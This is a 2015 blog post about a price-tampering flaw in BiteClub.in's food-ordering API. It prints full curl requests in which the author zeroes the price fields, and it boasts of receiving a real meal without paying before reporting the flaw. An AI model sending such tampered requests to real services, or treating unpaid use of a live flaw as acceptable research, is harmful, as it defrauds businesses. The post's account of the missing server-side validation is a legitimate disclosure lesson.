---           
layout: post
title: Unlimited free meals (courtesy BiteClub)
date: 2015-09-28 09:55:27 UTC
updated: 2015-09-28 09:55:27 UTC
comments: false
categories: biteclub biteclub.in security vulnerability
---

<div dir="ltr" style="text-align: left;" trbidi="on"><div dir="ltr" style="text-align: left;" trbidi="on"><h3 style="text-align: left;">What was the security threat and how I found it</h3>First of all I would like to thank BiteClub.in for developing a not-so-secure website because of which I was able to get meals free of cost this weekend.<br /><br />So it started with me trying to place an order on BiteClub.in for dinner. I tried several times but each time it failed. Damn, I was not able to place an order. So I thought I should check what all API calls they are making and try to figure out what might be the issue.<br /><br />For those who don't know what BiteClub.in is, it is a food providing service which connects local chefs directly to the users. It is currently serving in Gurgaon and Delhi.<br /><br />During the investigation of API calls, I found something very buggy. There was an API call to confirm the order to their server. This is the same API call which was failing. I started going deep into this API call and started analysing its parameters. The API call was(in curl format): <br /><pre class="language-bash"><code><br />curl 'http://biteclubproduction.elasticbeanstalk.com/api/order' -H 'Origin: http://biteclub.in' -H 'Accept-Encoding: gzip, deflate' -H 'Accept-Language: en-US,en;q=0.8,cs;q=0.6,es;q=0.4' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.132 Safari/537.36' -H 'Content-Type: application/json;charset=UTF-8' -H 'Accept: application/json, text/plain, */*' -H 'Referer: http://biteclub.in/checkout' -H 'Connection: keep-alive' --data-binary '{"<b>amount</b>":100,"customer":{"class":"in.biteclub.User","id":"****"},"orderDateParameter":"20150711","deliveryAddress":{"fullAddress":"****","landmark":"****","deliveryArea":{"class":"in.biteclub.DeliveryArea","id":"546312a4e4b0c20a57500d70"}},"deliveryArea":{"class":"in.biteclub.DeliveryArea","id":"546312a4e4b0c20a57500d70"},"hub":{"class":"in.biteclub.Hub","id":"553cbec3e4b0eee8a02f0645"},"deliveryTimeSlot":{"beginHour":19,"beginMinute":0,"endHour":20,"endMinute":0},"orderItems":[{"dish":{"class":"in.biteclub.Dish","id":"550874f5e4b01d0843550b49"},"quantity":1,"<b>finalPrice</b>":200}],"paymentMethod":"Cash on Delivery","channel":"Web","creditsUsed":true,"<b>numberOfCredits</b>":"200","<b>subtotal</b>":200,"taxes":{"VAT":0},"periodOfDay":"Dinner"}' --compressed</code></pre><pre class="language-bash"></pre><br />From this API call, I was able to figure out following information:<br /><br /><ol style="text-align: left;"><li>API end-point: <b>http://biteclubproduction.elasticbeanstalk.com/api/order</b></li><li>There are four parameters in this call related to cost of the order which are:</li><ul><li><b>amount</b></li><li><b>finalPrice</b></li><li><b>numberOfCredits</b></li><li><b>subtotal</b></li></ul></ol>Finally I modified the API call and put 0(zero) as the price for last three parameters(i.e., finalPrice, numberOfCredits and subtotal) leaving amount as it was and bam it worked! That was all that was needed to get free food!&nbsp;</div><div dir="ltr" style="text-align: left;" trbidi="on"><br /></div><div dir="ltr" style="text-align: left;" trbidi="on"><b>YESSSS I was able to place orders at a cost of 0(zero)</b></div><div dir="ltr" style="text-align: left;" trbidi="on"><b><br /></b></div><div dir="ltr" style="text-align: left;" trbidi="on">The modified API call was:<br /><pre class="language-bash"><code><br />curl 'http://biteclubproduction.elasticbeanstalk.com/api/order' -H 'Origin: http://biteclub.in' -H 'Accept-Encoding: gzip, deflate' -H 'Accept-Language: en-US,en;q=0.8,cs;q=0.6,es;q=0.4' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.132 Safari/537.36' -H 'Content-Type: application/json;charset=UTF-8' -H 'Accept: application/json, text/plain, */*' -H 'Referer: http://biteclub.in/checkout' -H 'Connection: keep-alive' --data-binary '{"<b>amount</b>":100,"customer":{"class":"in.biteclub.User","id":"****"},"orderDateParameter":"20150711","deliveryAddress":{"fullAddress":"****","landmark":"****","deliveryArea":{"class":"in.biteclub.DeliveryArea","id":"546312a4e4b0c20a57500d70"}},"deliveryArea":{"class":"in.biteclub.DeliveryArea","id":"546312a4e4b0c20a57500d70"},"hub":{"class":"in.biteclub.Hub","id":"553cbec3e4b0eee8a02f0645"},"deliveryTimeSlot":{"beginHour":19,"beginMinute":0,"endHour":20,"endMinute":0},"orderItems":[{"dish":{"class":"in.biteclub.Dish","id":"550874f5e4b01d0843550b49"},"quantity":1,"<span style="background-color: #cccccc;"><b>finalPrice</b>":<b>0</b></span>}],"paymentMethod":"Cash on Delivery","channel":"Web","creditsUsed":true,<span style="background-color: #cccccc;">"<b>numberOfCredits</b>":"<b>0</b>"</span>,<span style="background-color: #cccccc;">"<b>subtotal</b>":<b>0</b></span>,"taxes":{"VAT":0},"periodOfDay":"Dinner"}' --compressed</code></pre><pre class="language-bash"></pre><br />Seconds after running this command in my Terminal, I got the confirmation email from BiteClub that my order had been successfully placed and yes the cost of the order in that email was <b><i>zero</i></b>&nbsp;:)<br />Here is the screenshot of the email:<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://1.bp.blogspot.com/-I2ND_MhV8oA/Va4jN7-bHDI/AAAAAAAABWI/EZrJ4d8LuUk/s1600/Screen%2BShot%2B2015-07-21%2Bat%2B4.14.16%2Bpm.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://1.bp.blogspot.com/-I2ND_MhV8oA/Va4jN7-bHDI/AAAAAAAABWI/EZrJ4d8LuUk/s1600/Screen%2BShot%2B2015-07-21%2Bat%2B4.14.16%2Bpm.png" /></a></div><br /><div style="text-align: left;">And then after a few hours, I got the food.&nbsp;</div><div style="text-align: left;">I asked the delivery boy: How much should I pay?</div><div style="text-align: left;">Delivery boy: Nothing Sir! Your order cost is 0.</div><div style="text-align: left;"><br /></div><div style="text-align: left;">So in the whole process from ordering to delivery, they were not able to figure out how the cost of a particular item could be 0.</div><h3 style="text-align: left;"><b>Why did this security problem occur?</b></h3>I never thought, any developer could commit this silly mistake. They only made client side calculations and validations. No server side calculations or checks were in place. Whatever the cost and prices of the items were sent in the request, they were used directly without validating them for their correctness.<br /><br /><h3 style="text-align: left;"><b>The even bigger mistake :</b></h3>It leaves me absolutely furious to see developers and startup so blatantly ignore security. How can they assume that they can implement insecure, non-encrypted API calls with no mechanisms for establishing the client and user's identity only on the assumption that "no one would take the time to meddle with our API" for a free (insert Pizza/Salad/Thaali here). A similar incident had come to surface, much to the shock of any sane geek when Ola was making wallet transactions on an open HTTP API. Bravo Sirs! With the availability of federated identity systems and now even the OAuth mechanisms provided by FaceBook, Google, Twitter, GitHub etc. it has become so difficult not to create a secure native / web client, but somehow, someone manages to do it :)n<br /><b><br /></b><br /><h3 style="text-align: left;">Telling this to BiteClub.in</h3><div>I sent an email to delicious@biteclub.in</div><blockquote class="tr_bq"><div class="p1"><span class="s1">Hello Biteclub,</span></div><div class="p1"><span class="s1">This evening (around 5 PM), I was trying to place an order on your website: biteclub.in but was not able to do so. On the last page, I was always getting “Failure”. So, just out of curiosity, I tried to figure out what may be the issue I am facing. While debugging that I found a security threat on your website. I explored it a bit more. Finally, I was able to place an order (worth Rs 200) on your website by modifying the cost to 0.</span></div></blockquote>But to my surprise, they did not reply and did not even bother to contact me to enquire more about the problem.<br /><br />I sent this mail at 7:22 PM. When I rechecked the issue at 11:00 PM, it was still there and it was still allowing me to place an order with cost zero. I was really shocked at their response. <b>How can they just ignore such a big security threat on their website? OK, I'll take back my words, this is not so much a threat but it's more of an open invitation to anyone who can, and it's really simple, to order and have unlimited free food being so generously made available by biteclub.</b><br /><b><br /></b>I then sent a message to them on facebook, it was seen instantly, but again, no reply.<br /><br />So, I decided to notify their founders regarding the issue. I messaged all the founders on the linkedin. But all in vain. Nobody responded.<br /><br />I had to go out of station for few days after that. On coming back, I rechecked it. They had fixed it finally.<br /><br />It is very sad to know that these startups are just building websites/application but not putting in adequate mechanisms to ensure the safety of their applications. Also, their negligence to the mails and messages was very disappointing. I was very ready to explain the issue to them but they never bothered asking me. They simply ignored them. But I am happy that they have at least fixed it.<br /><br /><h2 style="text-align: left;">My Free Meal Pic ;)</h2><div class="separator" style="clear: both; text-align: center;"><a href="http://2.bp.blogspot.com/-bdQ-ICHKi7s/VgkObD9DILI/AAAAAAAABYg/tPHPaETKnrU/s1600/2015-07-11%2B19.23.55.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="480" src="http://2.bp.blogspot.com/-bdQ-ICHKi7s/VgkObD9DILI/AAAAAAAABYg/tPHPaETKnrU/s640/2015-07-11%2B19.23.55.jpg" width="640" /></a></div><div><br /></div><br /></div></div>